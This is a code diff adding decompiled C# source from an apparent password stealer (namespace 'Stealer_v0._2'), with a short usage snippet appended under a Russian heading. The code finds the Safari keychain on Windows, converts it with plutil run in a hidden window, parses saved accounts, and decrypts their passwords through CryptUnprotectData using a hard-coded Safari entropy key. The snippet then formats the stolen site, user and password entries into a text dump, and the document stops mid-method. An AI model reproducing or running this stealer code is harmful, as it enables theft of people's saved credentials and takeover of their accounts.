@@ -1,0 +1,397 @@
+using System;
+using System.Collections;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Text.RegularExpressions;
+
+namespace Stealer_v0._2
+{
+	// Token: 0x0200001A RID: 26
+	public class Safari_Decrypt
+	{
+		// Token: 0x0600008B RID: 139 RVA: 0x00007DB8 File Offset: 0x000061B8
+		[DebuggerNonUserCode]
+		public Safari_Decrypt()
+		{
+		}
+
+		// Token: 0x0600008C RID: 140
+		[DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+		private static extern bool CryptUnprotectData(ref Safari_Decrypt.DATA_BLOB pCipherText, ref string ppszDescription, ref Safari_Decrypt.DATA_BLOB pEntropy, IntPtr pReserved, ref Safari_Decrypt.CRYPTPROTECT_PROMPTSTRUCT pPrompt, int dwFlags, ref Safari_Decrypt.DATA_BLOB pPlainText);
+
+		// Token: 0x0600008D RID: 141 RVA: 0x00007DC4 File Offset: 0x000061C4
+		private static void InitBLOB(byte[] data, ref Safari_Decrypt.DATA_BLOB blob)
+		{
+			bool flag = data == null;
+			if (flag)
+			{
+				data = new byte[1];
+			}
+			blob.pbData = Marshal.AllocHGlobal(data.Length);
+			flag = blob.pbData.Equals(IntPtr.Zero);
+			if (flag)
+			{
+			}
+			blob.cbData = checked((uint)data.Length);
+			Marshal.Copy(data, 0, blob.pbData, data.Length);
+		}
+
+		// Token: 0x0600008E RID: 142 RVA: 0x00007E30 File Offset: 0x00006230
+		public static List<Safari_Decrypt.SiteLogin> Populate()
+		{
+			List<Safari_Decrypt.SiteLogin> list = new List<Safari_Decrypt.SiteLogin>();
+			try
+			{
+				string input = Safari_Decrypt.ConvertKeyChain();
+				Regex regex = new Regex("<key>Account</key><string>(?<user>.+?)</string>.+?<data>(?<pass>.*?)</data>.+?<key>Server</key><string>(?<server>.+?)</string>");
+				try
+				{
+					foreach (object obj in regex.Matches(input))
+					{
+						Match match = (Match)obj;
+						list.Add(new Safari_Decrypt.SiteLogin
+						{
+							URL = match.Groups["server"].Value,
+							User = match.Groups["user"].Value,
+							Pass = Safari_Decrypt.DecryptPass(Convert.FromBase64String(match.Groups["pass"].Value))
+						});
+					}
+				}
+				finally
+				{
+					IEnumerator enumerator;
+					bool flag = enumerator is IDisposable;
+					if (flag)
+					{
+						(enumerator as IDisposable).Dispose();
+					}
+				}
+			}
+			catch (Exception ex)
+			{
+			}
+			return list;
+		}
+
+		// Token: 0x0600008F RID: 143 RVA: 0x00007F50 File Offset: 0x00006350
+		private static string DecryptPass(byte[] EncPass)
+		{
+			byte[] data = new byte[]
+			{
+				29,
+				172,
+				168,
+				248,
+				211,
+				184,
+				72,
+				62,
+				72,
+				125,
+				62,
+				10,
+				98,
+				7,
+				221,
+				38,
+				230,
+				103,
+				129,
+				3,
+				231,
+				178,
+				19,
+				165,
+				176,
+				121,
+				238,
+				79,
+				15,
+				65,
+				21,
+				237,
+				123,
+				20,
+				140,
+				229,
+				75,
+				70,
+				13,
+				193,
+				142,
+				254,
+				214,
+				231,
+				39,
+				117,
+				6,
+				139,
+				73,
+				0,
+				220,
+				15,
+				48,
+				160,
+				158,
+				253,
+				9,
+				133,
+				241,
+				200,
+				170,
+				117,
+				193,
+				8,
+				5,
+				121,
+				1,
+				226,
+				151,
+				216,
+				175,
+				128,
+				56,
+				96,
+				11,
+				113,
+				14,
+				104,
+				83,
+				119,
+				47,
+				15,
+				97,
+				246,
+				29,
+				142,
+				143,
+				92,
+				178,
+				61,
+				33,
+				116,
+				64,
+				75,
+				181,
+				6,
+				110,
+				171,
+				122,
+				189,
+				139,
+				169,
+				126,
+				50,
+				143,
+				110,
+				6,
+				36,
+				217,
+				41,
+				164,
+				165,
+				190,
+				38,
+				35,
+				253,
+				238,
+				241,
+				76,
+				15,
+				116,
+				94,
+				88,
+				251,
+				145,
+				116,
+				239,
+				145,
+				99,
+				111,
+				109,
+				46,
+				97,
+				112,
+				112,
+				108,
+				101,
+				46,
+				83,
+				97,
+				102,
+				97,
+				114,
+				105
+			};
+			Safari_Decrypt.DATA_BLOB data_BLOB;
+			Safari_Decrypt.InitBLOB(data, ref data_BLOB);
+			Safari_Decrypt.DATA_BLOB data_BLOB2;
+			Safari_Decrypt.InitBLOB(EncPass, ref data_BLOB2);
+			string text = null;
+			IntPtr intPtr;
+			IntPtr pReserved = intPtr;
+			Safari_Decrypt.CRYPTPROTECT_PROMPTSTRUCT cryptprotect_PROMPTSTRUCT2;
+			Safari_Decrypt.CRYPTPROTECT_PROMPTSTRUCT cryptprotect_PROMPTSTRUCT = cryptprotect_PROMPTSTRUCT2;
+			Safari_Decrypt.DATA_BLOB data_BLOB3;
+			bool flag = !Safari_Decrypt.CryptUnprotectData(ref data_BLOB2, ref text, ref data_BLOB, pReserved, ref cryptprotect_PROMPTSTRUCT, 0, ref data_BLOB3);
+			checked
+			{
+				string result;
+				if (flag)
+				{
+					result = string.Empty;
+				}
+				else
+				{
+					byte[] array = new byte[(int)data_BLOB3.cbData + 1];
+					Marshal.Copy(data_BLOB3.pbData, array, 0, (int)data_BLOB3.cbData);
+					StringBuilder stringBuilder = new StringBuilder();
+					int num = 1;
+					int num2 = array.Length - 1;
+					int num3 = num;
+					for (;;)
+					{
+						int num4 = num3;
+						int num5 = num2;
+						if (num4 > num5)
+						{
+							break;
+						}
+						flag = (array[num3] != 0);
+						if (flag)
+						{
+							stringBuilder.Append(Convert.ToChar(array[num3]));
+						}
+						num3++;
+					}
+					result = stringBuilder.ToString();
+				}
+				return result;
+			}
+		}
+
+		// Token: 0x06000090 RID: 144 RVA: 0x000084E4 File Offset: 0x000068E4
+		private static string ConvertKeyChain()
+		{
+			bool flag = IntPtr.Size == 8;
+			string str;
+			if (flag)
+			{
+				str = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + " (x86)\\Common Files\\Apple\\Apple Application Support\\";
+			}
+			else
+			{
+				str = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\Common Files\\Apple\\Apple Application Support\\";
+			}
+			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Apple Computer\\Preferences";
+			flag = File.Exists(str + "plutil.exe");
+			string result;
+			if (flag)
+			{
+				bool flag2 = File.Exists(text + "\\keychain.plist");
+				if (flag2)
+				{
+					try
+					{
+						Process process = new Process();
+						Process process2 = process;
+						ProcessStartInfo startInfo = process2.StartInfo;
+						startInfo.WindowStyle = ProcessWindowStyle.Hidden;
+						startInfo.UseShellExecute = false;
+						startInfo.RedirectStandardOutput = true;
+						startInfo.CreateNoWindow = true;
+						startInfo.FileName = str + "plutil.exe";
+						startInfo.Arguments = string.Concat(new string[]
+						{
+							" -convert xml1 -o \"",
+							text,
+							"\\Appl.xml\" \"",
+							text,
+							"\\keychain.plist\""
+						});
+						process2.Start();
+						process2.WaitForExit();
+						process2.Dispose();
+						string text2 = File.ReadAllText(text + "\\Appl.xml");
+						text2 = text2.Replace("\t", null);
+						text2 = text2.Replace("\n", null);
+						File.Delete(text + "\\Appl.xml");
+						return text2;
+					}
+					catch (Exception ex)
+					{
+						return ex.Message;
+					}
+				}
+				result = null;
+			}
+			else
+			{
+				result = null;
+			}
+			return result;
+		}
+
+		// Token: 0x02000034 RID: 52
+		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+		private struct DATA_BLOB
+		{
+			// Token: 0x040000E5 RID: 229
+			public uint cbData;
+
+			// Token: 0x040000E6 RID: 230
+			public IntPtr pbData;
+		}
+
+		// Token: 0x02000035 RID: 53
+		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+		private struct CRYPTPROTECT_PROMPTSTRUCT
+		{
+			// Token: 0x040000E7 RID: 231
+			public int cbSize;
+
+			// Token: 0x040000E8 RID: 232
+			public int dwPromptFlags;
+
+			// Token: 0x040000E9 RID: 233
+			public IntPtr hwndApp;
+
+			// Token: 0x040000EA RID: 234
+			public string szPrompt;
+		}
+
+		// Token: 0x02000036 RID: 54
+		public struct SiteLogin
+		{
+			// Token: 0x040000EB RID: 235
+			public string URL;
+
+			// Token: 0x040000EC RID: 236
+			public string User;
+
+			// Token: 0x040000ED RID: 237
+			public string Pass;
+		}
+	}
+}
+
+
+
+использование
+
+public static void Start()
+		{
+			string text = null;
+			List<Safari_Decrypt.SiteLogin> list = Safari_Decrypt.Populate();
+			try
+			{
+				foreach (Safari_Decrypt.SiteLogin siteLogin in list)
+				{
+					text = text + "Site: " + siteLogin.URL + "\r\n";
+					text = text + "User: " + siteLogin.User + "\r\n";
+					text = text + "Pass: " + siteLogin.Pass + "\r\n";
+				}
+			}
